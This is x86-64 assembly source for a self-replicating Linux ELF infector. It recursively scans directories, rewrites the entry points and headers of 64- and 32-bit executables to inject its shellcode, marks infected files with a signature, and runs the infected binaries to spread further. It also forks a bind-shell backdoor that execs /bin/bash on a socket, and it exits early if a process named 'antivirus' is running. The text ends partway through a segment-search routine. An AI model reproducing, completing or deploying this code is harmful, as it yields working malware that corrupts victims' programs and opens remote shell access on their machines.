; _____________________
;|      O____O     ***|
;|     (° u °)     ** |
;|    /--------\   /  |
;| o--|531-m31c|--/	  |
;|    \--------/      |
;|      N    N        |
;|____________________|


global _start

_start:
	;First we wanna check that no program containning "antivirus" in it's name is running"
	mov rax, 0x00636f72702f; /proc
	push rax
	lea rdi, [rsp]
	call check_process
	add rsp, 8
	;create network backdoor
	call create_network_backdoor
	;chdir to /
;	mov rax, 80
;	xor rdi, rdi
;	mov rdi, 0x002f; "t\0"
;	push rdi
;	lea rdi, [rsp]
;	syscall; chdir("/tmp/test");
;	add rsp, 8
	;infect current directory
	push 0x0000002e; our target directory here "."
	lea rdi, [rsp]
	call list_files
	add rsp, 8

;jmp end_of_everything
exit_prog:
	mov	rax, 0x3c;
	mov rdi, 1
	syscall

;puts
ft_puts:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	call ft_strlen
	mov rdx, rax
	mov rax, 1
	mov rsi, rdi
	mov rdi, 1
	syscall
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

;this will simply print a newline
debug:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	mov rax, 1
	push 0x0000000a
	lea rsi, [rsp]
	mov rdx, 2
	mov rdi, 1
	syscall
	add rsp, 8
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

debugy:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	mov rax, 1
	push 0x00000a79
	lea rsi, [rsp]
	mov rdx, 2
	mov rdi, 1
	syscall
	add rsp, 8
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn
debugn:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	mov rax, 1
	push 0x00000a6e
	lea rsi, [rsp]
	mov rdx, 2
	mov rdi, 1
	syscall
	add rsp, 8
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

%define REGULAR_FILE 8
%define DIRECTORY_FILE 4

check_process:
	sub rsp, 1024;this is gonna be our buffer
	sub rsp, 4; fd
	mov rsi, 65536; O_RDONLY | O_DIRECTORY
	xor rdx, rdx
	mov rax, 2; sycall open
	syscall
	cmp rax, -1
	je exit_prog ;open error
 	mov [rsp], rax
	cp_dir_read_loop:
		mov rdi, [rsp];fd of dir
		lea rsi, [rsp + 4]; addr of buffer
		mov rdx, 1024;reading max 1024 bytes
		mov rax, 217;getdents64 syscall
		syscall
		cmp rax, -1
		je exit_prog;getdents64 err
		cmp rax, 0
		je cp_dir_read_exit; done reading dir
		mov r10, rax; store number bytes read
		xor rcx, rcx; will serve as index to parse files
		cp_parse_file_loop:
			mov r8, rsi; save rsi
			lea r9, [rsi + rcx] ; current linux_dirent64*
			lea rsi, [r9 + 19];filename
			cmp byte[r9 + 18], DIRECTORY_FILE; [r9 +18] is file type
			jne cp_skip_file
			mov rdi, rsi; pass fname as arg
			call check_num_name; we only want things like /proc/19, /proc/4219, ...
			cmp rax, 0
			jne cp_skip_file
			call check_cmdline; gonna go check the cmdline file of that prog and exit if it contains the word "antivirus"
			;do stuff here
			cp_skip_file: 
			mov rsi, r8
			xor rdx, rdx
			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
			add rcx, rdx
			cmp rcx, r10
			jae cp_parse_file_exit
			jmp cp_parse_file_loop
		cp_parse_file_exit: 
		jmp cp_dir_read_loop
	cp_dir_read_exit:
	add rsp, 4
	add rsp,1024
retn
;int check_num_name(char *) check if string only contains digits
; returns 1 if name does contain something else than digits or 0 if there's only digits
check_num_name:
	push rcx

	xor rcx, rcx
	xor rax, rax
	loop_cnn:
		cmp byte[rdi + rcx], 0
		je loop_cnn_exit
		cmp byte[rdi + rcx], 0x30 ; '0'
		jb loop_cnn_bad_exit
		cmp byte[rdi + rcx], 0x39; '9'
		ja loop_cnn_bad_exit
		inc rcx
		jmp loop_cnn
	loop_cnn_bad_exit:
	mov rax, 1
	loop_cnn_exit:

	pop rcx
retn

; void check_cmdline(char *fname)
check_cmdline:
	push rsi
	push rcx
	push rbx
	push rdx
	sub rsp, 64; buffer to contain full path such as /proc/19/cmdline
	;First we copy /proc
	mov byte[rsp], '/'
	mov byte[rsp + 1], 'p'
	mov byte[rsp + 2], 'r'
	mov byte[rsp + 3], 'o'
	mov byte[rsp + 4], 'c'
	mov byte[rsp + 5], '/'
	;now we copy fname
	mov rcx, 6
	xor rbx, rbx
	loop_ccl:
		mov dl, byte[rdi + rbx]
		cmp dl, 0
		je loop_ccl_exit
		mov byte[rsp + rcx], dl
		inc rbx
		inc rcx
		jmp loop_ccl
	loop_ccl_exit:
	; now we copy /cmdline
	mov byte[rsp + rcx], '/'
	inc rcx
	mov byte[rsp + rcx], 'c'
	inc rcx
	mov byte[rsp + rcx], 'm'
	inc rcx
	mov byte[rsp + rcx], 'd'
	inc rcx
	mov byte[rsp + rcx], 'l'
	inc rcx
	mov byte[rsp + rcx], 'i'
	inc rcx
	mov byte[rsp + rcx], 'n'
	inc rcx
	mov byte[rsp + rcx], 'e'
	inc rcx
	;Add the final \0
	mov byte[rsp + rcx], 0
	; Ok now we have our full path ready to be read
	lea rdi, [rsp]
	call check_cmdline_content; will actually read the file
	cmp rax, 0
	jne exit_prog ;antivirus is running

	add rsp, 64
	pop rdx
	pop rbx
	pop rcx
	pop rsi
retn
;  int check_cmdline_content(char *path)
check_cmdline_content:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rsi
	push rdx
	push rdi


	call open_file
	mov rdi, rax; store fd in rdi
	sub rsp, 1 
	xor rcx, rcx
	mov rcx, 0x0073 ; "s\0"
	push rcx
	mov rcx, 0x7572697669746e61 ; "antiviru"
	push rcx
	xor rcx, rcx
	loop_ccc:
		lea rsi, [rsp + 16]
		mov rdx, 1; read one byte at the time
		mov rax, 0
		push rcx ; save rcx coz fcking syscall will modify it
		syscall; read(rdi, rsi, rdx);
		pop rcx
		cmp rax, 0
		je end_of_ccc
		mov dl, [rsp + rcx]
		cmp byte[rsp + 16], dl
		jne reset_rcx_ccc
		inc rcx
		cmp rcx, 9 ;antivirus 8 bytes long
		je ccc_found
		jmp loop_ccc
		reset_rcx_ccc:
			xor rcx, rcx
			jmp loop_ccc
	ccc_not_found:
		mov rax, 0
		jmp end_of_ccc
	ccc_found :
		mov rax, 1
	end_of_ccc:
		add rsp, 17
		push rax;save return val
		mov rax, 3
		syscall
		pop rax;restore return val
	
	pop rdi
	pop rdx
	pop rsi
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

; void create_network_backdoor()
create_network_backdoor:
	mov rax, 57; fork
	syscall;rax = fork()
	cmp rax, 0
	jne continue_your_life
	call pop_shell_on_net; child process
	jmp exit_prog; kill child
	continue_your_life:; parent or if fork failed
retn

;void pop_shell_on_net
pop_shell_on_net:
	sub rsp, 16; struct sockaddr_in servaddr
	sub rsp, 16; struct sockaddr_in cli
	sub rsp, 12; int sockfd, connfd, len (4*3)
	;create socket
	mov rax, 41
	mov rdi, 2;AF_INET
	mov rsi, 1;SOCK_STREAM
	xor rdx, rdx
	syscall; rax = socket(AF_INET, SOCK_STREAM, 0);
	cmp rax, -1
	je exit_prog; err
	mov DWORD[rsp], eax; sockfd = rax
	; prepare servaddr for bind
	mov WORD[rsp + 28], 2;servaddr.sin_family = AF_INET
	mov WORD[rsp + 30], 31504; servaddr.sin_port = htons(4219) == 31504
	mov DWORD[rsp + 32], 16777343; servaddr.sin_addr.s_addr = inet_addr("127.0.0.1") == 16777343 
	;bind
	mov rax, 49
	xor rdi, rdi
	mov edi, DWORD[rsp]
	lea rsi, [rsp + 28]
	mov rdx, 16
	syscall; bind(sockfd, (struct sockaddr*)&servaddr, sizeof(servaddr))
	cmp rax, 0
	jne exit_prog; err
	;listen
	mov rax, 50
	mov rsi, 2
	syscall; listen(sockfd, 2)
	cmp rax, 0
	jne exit_prog; err
	;accept
	mov DWORD[rsp + 8], 16; len = sizeof(struct sockaddr_in)
	mov rax, 43
	lea rsi, [rsp + 12]
	lea rdx, [rsp + 8]
	syscall; rax = accept(sockfd, (struct sockaddr*)&cli, &len)
	cmp rax, -1
	je exit_prog; err
	mov DWORD[rsp + 4], eax
	; at this point our server is running and has accepted a client
	xor rdi, rdi
	mov edi, DWORD[rsp + 4]; pass connfd as param

	call exec_shell
	add rsp, 12
	add rsp, 32
retn

; exec_shell(int connfd)
exec_shell:
	xor rax, rax
	mov rax, 0x0068; "h\0"
	push rax
	mov rax, 0x7361622f6e69622f; "/bin/bas"
	push rax
	sub rsp, 16; argvs "/bin/bash", NULL
	lea rbx, [rsp+16]
	mov QWORD[rsp], rbx; *argvs == "/bin/bash"
	xor rbx, rbx
	mov QWORD[rsp + 8], rbx; argvs[1] = NULL
	sub rsp, 8
	mov QWORD[rsp], rbx; envp = {NULL}
	push rdi
	mov rax, 3
	mov rdi, 0
	syscall;close(0)
	mov rax, 3
	mov rdi, 1
	syscall;close(1)
	mov rax, 3
	mov rdi, 2
	syscall;close(2)
	pop rdi
	;redirect fds
	mov rax, 33
	mov rsi, 0
	syscall;dup2(connfd, 0);
	mov rax, 33
	mov rsi, 1
	syscall;dup2(connfd, 1);	
	mov rax, 33
	mov rsi, 2
	syscall;dup2(connfd, 2);
	; time to execve
	mov rax, 59
	lea rdi, [rsp + 24]; "/bin/bash"
	lea rsi, [rsp + 8]
	lea rdx, [rsp]
	syscall; execve("/bin/bash", argv, envp);
	jmp exit_prog

	add rsp, 8
	add rsp, 16
	add rsp, 16

retn

ft_strlen:
	xor rax, rax
	loop:
		cmp byte[rdi + rax], 0
		je strlen_exit
		inc rax
		jmp loop
	strlen_exit:
retn


;list all files in a folder and calls falmine_file to infect it if it's a regular file
list_files:
	sub rsp, 1024;this is gonna be our buffer
	sub rsp, 4; fd
	mov rsi, 65536; O_RDONLY | O_DIRECTORY
	xor rdx, rdx
	mov rax, 2; sycall open
	syscall
	cmp rax, -1
	je exit_prog ;open error
 	mov [rsp], rax
	dir_read_loop:
		mov rdi, [rsp];fd of dir
		lea rsi, [rsp + 4]; addr of buffer
		mov rdx, 1024;reading max 1024 bytes
		mov rax, 217;getdents64 syscall
		syscall
		cmp rax, -1
		je exit_prog;getdents64 err
		cmp rax, 0
		je dir_read_exit; done reading dir
		mov r10, rax; store number bytes read
		xor rcx, rcx; will serve as index to parse files
		parse_file_loop:
			mov r8, rsi; save rsi
			lea r9, [rsi + rcx] ; current linux_dirent64*
			lea rsi, [r9 + 19];filename
			cmp byte[r9 + 18], DIRECTORY_FILE; [r9 + 18]
			jne maybe_reg_file
			cmp byte[r9 + 19], '.'
			je skip_file
			mov rdi, rsi; pass fname as arg
			call handle_dir
			jmp skip_file
			maybe_reg_file:
			cmp byte[r9 + 18], 	REGULAR_FILE ; [r9 +18] is file type
			jne skip_file
			mov rdi, rsi; pass fname as arg
			call famine_file ; void famine_file(char * fname);
			skip_file: 
			mov rsi, r8
			xor rdx, rdx
			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
			add rcx, rdx
			cmp rcx, r10
			jae parse_file_exit
			jmp parse_file_loop
		parse_file_exit: 
		jmp dir_read_loop
	dir_read_exit:
	add rsp, 4
	add rsp,1024

retn

;void handle_dir(char *fname)
;we wanna open the dir then search in it (and nested directories if needed) for a binary to infect then launch
;that infected binary will then infect recursively everything else from it's own directory (.) ownards
;this will make system infection faster
handle_dir:
	push rdi
	push rsi
	push rdx
	push r10
	push rcx
	push r8

	mov rax, 57
	syscall; rax = fork()
	cmp rax, 0
	jne hd_parent
	mov rax, 80
;	call ft_puts
	;call debug
	syscall;chdir(fname);
	push 0x0000002e; our target directory here "."
	lea rdi, [rsp]	
	call rec_infect_dir
	add rsp, 8
	;infect directory here
	jmp exit_prog
	hd_parent:

	;wait for child
	mov rdi, rax; pid
	mov rax, 61; sys_wait4
	mov rsi, 0
	mov rdx, 0
	mov r10, 0
	syscall; wait4(pid, NULL, 0, NULL); we wait for child to finish
	;pop and return
	pop r8
	pop rcx
	pop r10
	pop rdx
	pop rsi
	pop rdi
;	call debugy
retn

;void rec_infect_dir(char *fname)
rec_infect_dir:
	sub rsp, 1024;this is gonna be our buffer
	sub rsp, 4; fd
	mov rsi, 65536; O_RDONLY | O_DIRECTORY
	xor rdx, rdx
	mov rax, 2; sycall open
	syscall
	cmp rax, -1
	je exit_prog ;open error
 	mov [rsp], rax
	rec_read_loop:
		mov rdi, [rsp];fd of dir
		lea rsi, [rsp + 4]; addr of buffer
		mov rdx, 1024;reading max 1024 bytes
		mov rax, 217;getdents64 syscall
		syscall
		cmp rax, -1
		je exit_prog;getdents64 err
		cmp rax, 0
		je rec_read_exit; done reading dir
		mov r10, rax; store number bytes read
		xor rcx, rcx; will serve as index to parse files
		rec_parse_file_loop:
			mov r8, rsi; save rsi
			lea r9, [rsi + rcx] ; current linux_dirent64*
			lea rsi, [r9 + 19];filename
			cmp byte[r9 + 18], 	REGULAR_FILE ; [r9 +18] is file type
			jne rec_skip_file
			mov rdi, rsi; pass fname as arg
			call famine_file ; void famine_file(char * fname);
			cmp r13, 0
			je rec_skip_file; we still need to find a file able to infect others
			lea rdi, [r9 + 19];filename
			call launch_infected
			rec_skip_file: 
			mov rsi, r8
			xor rdx, rdx
			mov dx, WORD[r9 + 16] ;len of current linux_dirent64*
			add rcx, rdx
			cmp rcx, r10
			jae rec_parse_file_exit
			jmp rec_parse_file_loop
		rec_parse_file_exit: 
		jmp rec_read_loop
	rec_read_exit:
	add rsp, 4
	add rsp,1024

	push 0x0000002e; our target directory here "."
	lea rdi, [rsp]
	call list_files; RECURSIVNESS HERE, if we couldn't find a new host for the virus... Restart the process starting at current directory
	add rsp, 8
retn

;void launch_infected(char *fname)
;basically execve(fname, {fname, NULL}, {NULL});
launch_infected:
	call ft_puts
	call debug
	call print_cwd
	sub rsp, 16; {fname, NULL}

	mov QWORD[rsp], rdi
	mov QWORD[rsp + 8], 0
	lea rsi, [rsp]
	lea rdx, [rsp + 8]
	mov rax, 59
	syscall;execve(fname, {fname, NULL}, {NULL});
	add rsp, 16
	jmp exit_prog; new infected binary will carry on infecting the rest of the folder and nested folders
retn

print_cwd:
push rdi
	sub rsp, 1024
	
	lea rdi, [rsp]
	mov rsi, 1000
	mov rax, 79
	syscall
	call ft_puts
	call debug
	add rsp, 1024
pop rdi
retn

;infect ONE file
;int famine_file(char *fname)
;special note : ret value will be in r13, will return 1 if binary is able to infect others, 0 otherwise
famine_file:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rax
	push rsi
	push rdx
	push rdi

	sub rsp, 8; char *fname
	sub rsp, 8; int filesize
	sub rsp, 8; void *file returned by mmap
	sub rsp, 4 ;fd
	
	;call ft_puts ;PRINT FNAME FOR DEBUGGING
	xor r13, r13
	mov [rsp + 20], rdi
	call open_file
	cmp rax, -1
	je leave_famine_file ; could not open file, so skip it
	mov [rsp], rax;stock fd
	call check_already_infected ; int check_already_infected(int fd)
	cmp rax, 0
	jne leave_famine_file; file is already infected 
	mov rdi, [rsp]; fd
	lea rsi, [rsp + 12]; &fsize
	call map_file ; map_file(int fd, int *filesize)
	mov [rsp+4], rax; stock void *file

	; parse MAGIC
	cmp QWORD [rsp + 12], 52; sizeof(Elf32_Ehdr) == 52, check that fsize > sizeof(Elf32_Ehdr) 
	jb leave_famine_file
	xor rax, rax
	mov rax, QWORD[rsp+4]
	cmp byte[rax], 0x7f
	jne leave_famine_file
	cmp byte[rax + 1], 'E'
	jne leave_famine_file
	cmp byte[rax + 2], 'L'
	jne leave_famine_file
	cmp byte[rax + 3], 'F'
	jne leave_famine_file
	cmp WORD[rax + 16], 2;e_type , 2 == ET_EXEC
	je elf_goodfile
	cmp WORD[rax + 16], 3; e_type ET_DYN
	jne obj_file
	elf_goodfile:
	cmp byte[rax + 4], 2 ; ELFCLASS64 = 2, when handling 32bit changed the jmp
	jne file32bit
	;64BIT FILE
	mov rdi, [rsp + 20] ; fname
	call create_infected_file;will return a fd to it
	cmp rax, -1
	je leave_famine_file; skip if we couldn't create add
	mov rdi, [rsp + 4]; void *file
	mov rsi, rax; wfd
	mov rdx, [rsp + 12]; fsize
	call parse64elf
	mov rdi, [rsp + 20]; fname 
	call overwrite_file
	mov r13, 1
	jmp leave_famine_file
	;32BIT FILE
	file32bit:
	cmp byte[rax + 4], 1; ELFCLASS32 = 1
	jne leave_famine_file
	mov rdi, [rsp + 20] ; fname
	call create_infected_file;will return a fd to it
	cmp rax, -1
	je leave_famine_file; skip if we couldn't create add
	mov rdi, [rsp + 4]; void *file
	mov rsi, rax; wfd
	mov rdx, [rsp + 12]; fsize
	call parse32elf
	mov rdi, [rsp + 20]; fname 
	call overwrite_file
	jmp leave_famine_file
	obj_file:
	cmp WORD[rax + 16], 1; ET_REL
	jne leave_famine_file
	;Obj file handle
	mov rdi, QWORD[rsp + 20]
	call open_append
	mov rdi, rax
	call write_signature
	mov rax, 3; close
	syscall
	; end parse MAGIC
	
	
	leave_famine_file:
	mov rax, 3 ; close syscall n.
	mov rdi, [rsp] ; close(fd)
	syscall

	;call debug

	add rsp, 4
	add rsp, 8
	add rsp, 8
	add rsp, 8
	pop rdi
	pop rdx
	pop rsi
	pop rax
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx
retn

open_file:
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 2
	syscall
retn


open_append:
	mov rsi, 1090
	xor rdx, rdx
	mov rax, 2
	syscall
retn

;we're gonna check if file already contains the signature
check_already_infected:
	push rbx
	push rcx
	push r8
	push r9
	push r10
	push rsi
	push rdx
	push rdi


	call open_file
	mov rdi, rax; store fd in rdi
	sub rsp, 1 
	mov rcx, 0x636c656d2d6c6573 ; "sel-melc"
	push rcx
	xor rcx, rcx
	loop_cai:
		lea rsi, [rsp + 8]
		mov rdx, 1; read one byte at the time
		mov rax, 0
		push rcx ; save rcx coz fcking syscall will modify it
		syscall; read(rdi, rsi, rdx);
		pop rcx
		cmp rax, 0
		je end_of_cai
		mov dl, [rsp + rcx]
		cmp byte[rsp + 8], dl
		jne reset_rcx_cai
		inc rcx
		cmp rcx, 8 ;sel-melc 8 bytes long
		je cai_found
		jmp loop_cai
		reset_rcx_cai:
			xor rcx, rcx
			jmp loop_cai
	cai_not_found:
		mov rax, 0
		jmp end_of_cai
	cai_found:
		mov rax, 1
	end_of_cai:
		add rsp, 9
		push rax;save return val
		mov rax, 3
		syscall
		pop rax;restore return val
	
	pop rdi
	pop rdx
	pop rsi
	pop r10
	pop r9
	pop r8
	pop rcx
	pop rbx

retn
; void *map_file(int fd, int *fsize)
; returns a ptr to fd mapped in memory
map_file:
	sub rsp, 8; start of file saved for lseek
	push rsi; save fsize

	; First we need to get the file size

	mov rax, 8; lseek
	mov rsi, 0
	mov rdx, 1; SEEK_CUR
	syscall; lseek(fd, 0, SEEK_CUR)
	
	mov [rsp + 8], rax; start = lseek(...)
	mov rax, 8
	mov rsi, 0
	mov rdx, 2; SEEK_END
	syscall; lseek(fd, 0, SEEK_END)
	pop rsi
	mov [rsi], rax; *fsize = lseek(...)
	
	push rsi
	mov rsi, [rsp + 8]
	mov rdx, 0; SEEK_SET
	mov rax, 8
	syscall; lseek(fd, start, SEEK_SET) put cursor back at start
	pop rsi; rsi is now fsize again
	
	;Time to map the file into memory
	mov rax, 9; mmap
	mov r8, rdi; fd
	mov rdi, 0; NULL
	mov rdx, 1; PROT_READ
	mov r10, 2; MAP_PRIVATE
	mov r9, 0
	mov rsi, [rsi]; *fsize
	syscall; mmap(NULL, size, PROT_READ, MAP_PRIVATE, fd, 0);
	cmp rax, -1
	jne mmap_no_err
	mov rax, 0; ret NUlL in case of err
	mmap_no_err:
	add rsp, 8
retn

;this function will rename fname_infected into fname, so we don't have a copy of the
; original bin but we edited it instead
; void overwrite_file(char *fname)
overwrite_file:
	call ft_strlen
	add rax, 10; so it can contain fname + "_infected" + '\0'
	sub rsp, rax; our string containing fname + "_infected" + '\0' is [rsp + 8]
	push QWORD rax
	lea rsi, [rsp + 8]
	xor rcx, rcx
	of_loop: ; basically a strcpy of fname
		cmp byte[rdi + rcx], 0
			je of_loop_exit
		mov dl, byte[rdi + rcx]
		mov byte[rsi + rcx], dl
		inc rcx
		jmp of_loop
	of_loop_exit:
	mov byte[rsi + rcx], '_'
	inc rcx
	mov byte[rsi + rcx], 'i'
	inc rcx
	mov byte[rsi + rcx], 'n'
	inc rcx
	mov byte[rsi + rcx], 'f'
	inc rcx
	mov byte[rsi + rcx], 'e'
	inc rcx
	mov byte[rsi + rcx], 'c'
	inc rcx
	mov byte[rsi + rcx], 't'
	inc rcx
	mov byte[rsi + rcx], 'e'
	inc rcx
	mov byte[rsi + rcx], 'd'
	inc rcx
	mov byte[rsi + rcx], 0
	;now rsi contains fname + "_infected"
	mov rbx, rdi ; swap rdi and rsi
	mov rdi, rsi
	mov rsi, rbx
	mov rax, 82
	syscall; rename(fname_infected, fname);
	pop QWORD rax
	add rsp, rax
retn

; int cread_infected_file(char *fname)
; creates a new file called fname + "_infected"
create_infected_file: 
push rcx
push rdx
	
	call ft_strlen
	add rax, 10; so it can contain fname + "_infected" + '\0'
	sub rsp, rax; our string containing fname + "_infected" + '\0' is [rsp + 8]
	push QWORD rax
	lea rsi, [rsp + 8]
	xor rcx, rcx
	cif_loop: ; basically a strcpy of fname
		cmp byte[rdi + rcx], 0
			je cif_loop_exit
		mov dl, byte[rdi + rcx]
		mov byte[rsi + rcx], dl
		inc rcx
		jmp cif_loop
	cif_loop_exit:
	mov byte[rsi + rcx], '_'
	inc rcx
	mov byte[rsi + rcx], 'i'
	inc rcx
	mov byte[rsi + rcx], 'n'
	inc rcx
	mov byte[rsi + rcx], 'f'
	inc rcx
	mov byte[rsi + rcx], 'e'
	inc rcx
	mov byte[rsi + rcx], 'c'
	inc rcx
	mov byte[rsi + rcx], 't'
	inc rcx
	mov byte[rsi + rcx], 'e'
	inc rcx
	mov byte[rsi + rcx], 'd'
	inc rcx
	mov byte[rsi + rcx], 0
	;now rsi contains fname + "_infected"
	mov rax, 2; open
	mov rdi, rsi
	mov rsi, 578 ; O_RDWR | O_CREAT | O_TRUNC
	mov rdx, 511; S_IRWXO | S_IRWXU | S_IRWXG
	syscall; open("fnam_infected", O_RDWR | O_CREAT | O_TRUNC, S_IRWXO | S_IRWXU | S_IRWXG )
	mov rbx, rax; save fd

	pop QWORD rax
	add rsp, rax
	mov rax, rbx
	pop rdx
	pop rcx
retn

%define SHELLCODE_LEN 6517 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
%define SHELLCODE_JMP_INDEX 6466; 44 + 5 (jmp)
%define PURE_SHELLCODE_LEN 6461 
; void parse64elf(void *file, int wfd, unsigned long fsize)
parse64elf:
	sub rsp, 8
	;ELF HEADER
	call has_data_seg
	mov QWORD[rsp], rax
	cmp rax, 0 ;We're gonna get pad to modify e_shoff
	je pad_text
	call get_data_pad
	jmp pad_done
	pad_text:
	call get_text_pad
	pad_done:
	mov r10, rax; contains pad
	call parse64elfheader
	;PROGRAM HEADERS
	cmp QWORD[rsp], 0
	je text_phdr_parse
	call parse64elfphdr ; will return pad
	jmp phdr_parse_done
	text_phdr_parse:
	call parse64elfphdrtext
	phdr_parse_done:
	;SECTIONS
	mov r10, rax; pass pad as 3rd param
	mov rax, [rsp]; so we know if we have a data_seg or not 
	call parse64elfsec
	
	add rsp, 8
retn

parse64elfheader:
	push rdi
	push rsi
	push rdx

	sub rsp, 8; new entrypoint stocked here
	cmp rax, 0
	je fne_text
	fne_data:
	call find_new_entry; will put it in rax
	jmp fne_done
	fne_text:
	call find_new_entry_text
	fne_done:
	;Copy the begining of Elf header till entry
	mov rbx, rdi
	mov rdi, rsi
	mov rsi, rbx
	mov rdx, 24 ; sizeof(Elf64_Ehdr) till entrypoint
	push rax
	mov rax, 1
	syscall; write(wfd, file, 24);
	;Time to handle the entrypoint
	pop rax
	mov QWORD[rsp], rax;
	add rsi, 32 ; points right after the entrypoint
	mov rbx, rsi ; store rsi void *file+32
	mov rsi, rsp
	mov rdx, 8
	mov rax, 1
	syscall; write(wfd, "0x41424344", 8); this will write custom entrypoint
	;write e_phoff
	mov rdx, 8
	mov rsi, rbx
	mov rax, 1
	syscall; write(wfd, file + 32, 8);
	mov QWORD[rsp], r10
	add QWORD[rsp], SHELLCODE_LEN
	mov rbx, [rsi + 8]; e_shoff
	add QWORD[rsp], rbx
	mov rbx, rsi
	mov rsi, rsp
	mov rax, 1
	syscall;write(wfd, &(e_shoff + SHELLCODE_LEN + pad), 8);
	;Copy the remainder of the elf header
	mov rsi, rbx
	add rsi, 16
	mov rdx, 16
	mov rax, 1
	syscall; write(wfd, file + 48, 16); copying everything after entrypoint


	add rsp, 8

	pop rdx
	pop rsi
	pop rdi
retn

; unsigned long find_new_entry(void *file)
; will return the offset to begining of our shellcode
find_new_entry:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_fne: 
		cmp cx, WORD[rsp]
		jge loop_fne_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_fne
		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_fne
		;we found the data segment ! bss ect... This is where the shellcode will be
		mov rax, QWORD[r9 + 40];store p_memsz
		add rax, QWORD[r9 + 16]; add p_vaddr so this gives us "the end" of the segment
		continue_fne:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_fne
	loop_fne_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn
; unsigned long find_new_entry_text(void *file)
; will return the offset to begining of our shellcode
find_new_entry_text:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_fnet: 
		cmp cx, WORD[rsp]
		jge loop_fnet_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_fnet
		cmp DWORD[r9 + 4], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
		jne continue_fnet
		;we found the text segment !This is where the shellcode will be
		mov rax, QWORD[r9 + 40];store p_memsz
		add rax, QWORD[r9 + 16]; add p_vaddr so this gives us "the end" of the segment
		continue_fnet:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_fnet
	loop_fnet_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn


; unsigned long find_end_data_seg(void *)
; will return the offset at which shellcode starts and where dataseg ends
find_end_data_seg:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_feds: 
		cmp cx, WORD[rsp]
		jge loop_feds_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_feds
		cmp DWORD[r9 + 4], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_feds
		;we found the data segment ! bss ect... This is where the shellcode will be
		mov rax, QWORD[r9 + 32];store p_filesz
		add rax, QWORD[r9 + 8]; add p_offset so this gives us "the end" of the segment
		continue_feds:
		inc rcx
		add rdx, 56; rdx += sizeof(Elf64_Phdr)
		jmp loop_feds
	loop_feds_exit: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

; unsigned long find_end_text_seg(void *)
; will return the offset at which shellcode starts and where dataseg ends
find_end_text_seg:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 56]
	mov WORD[rsp], bx; e_phnum stored
	mov rbx, QWORD[rdi + 32]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_fets: 
		cmp cx, WORD[rsp]
		jge loop_fets_exit
		lea r9, [rsi+rdx]; current phdr
